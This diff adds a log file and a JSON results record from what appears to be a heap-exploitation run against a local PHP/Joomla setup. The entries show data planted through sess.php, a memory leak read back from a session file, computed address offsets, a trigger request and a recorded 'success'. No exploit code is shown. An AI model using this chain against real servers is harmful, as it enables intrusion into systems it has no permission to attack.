@@ -1,0 +1,60 @@
+[02:12:17] master=174553 worker0=178035
+[02:12:17] POST /exploit/sess.php status=200 sent=80 ms=8 err=None
+[02:12:18] plant P=0x7f06c6281000 B0=0x7f06c6290000 heap=0x7f06c6200040
+[02:12:18] POST /exploit/sess.php status=502 sent=222 ms=26 err=None
+[02:12:19] GET /tmp/sess_tb1 status=200 len=102666
+[02:12:19] K=0x7f06c6284000 offsets={'K-P': 12288, 'K-B0': -49152, 'B0-K': 49152, 'K-X': 102400, 'K-S_dest': 110528, 'P-K': -12288, 'X-K': -102400, 'S_dest-K': -110528} geometry={'P_minus_K': -12288, 'X_minus_K': -102400, 'S_dest_minus_K': -110528, 'B0_minus_K': 49152, 'P_minus_X': 90112}
+[02:12:19] POST /exploit/sess.php status=200 sent=80 ms=2 err=None
+[02:12:19] POST /exploit/trigger.php status=200 sent=222 ms=2 err=None
+[02:12:20] POST /exploit/health.php status=200 sent=80 ms=0 err=None
+{
+ "label": "j2",
+ "master": 174553,
+ "worker0": 178035,
+ "P_plant": 139667071045632,
+ "B0_plant": 139667071107072,
+ "heap": 139667070517312,
+ "K_dest": 139667071057920,
+ "offsets": {
+  "K-P": 12288,
+  "K-B0": -49152,
+  "B0-K": 49152,
+  "K-X": 102400,
+  "K-S_dest": 110528,
+  "P-K": -12288,
+  "X-K": -102400,
+  "S_dest-K": -110528
+ },
+ "formula_check": {
+  "P_minus_K": -12288,
+  "X_minus_K": -102400,
+  "S_dest_minus_K": -110528,
+  "B0_minus_K": 49152,
+  "P_minus_X": 90112
+ },
+ "leak_get": {
+  "status": 200,
+  "len": 102666,
+  "attempt": 1
+ },
+ "leak_len": 102666,
+ "leak_sha1": "d41c2665672a322950548b94df950573d172ad80",
+ "worker_before_final": 178847,
+ "final_plant": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 20480 bytes) in <b>/tmp/opencode/joomla5/exploit/sess.php</b> on line <b>2</b><br />\n<br />\n<b>Warning</b>"
+ },
+ "final_trigger": {
+  "status": 200,
+  "head": "trigger-ok\n"
+ },
+ "marker_after": true,
+ "worker_after_final_trigger": 178847,
+ "worker_after_health": 178847,
+ "health": {
+  "status": 200,
+  "head": "health-ok\n"
+ },
+ "survived": true,
+ "success": true
+}
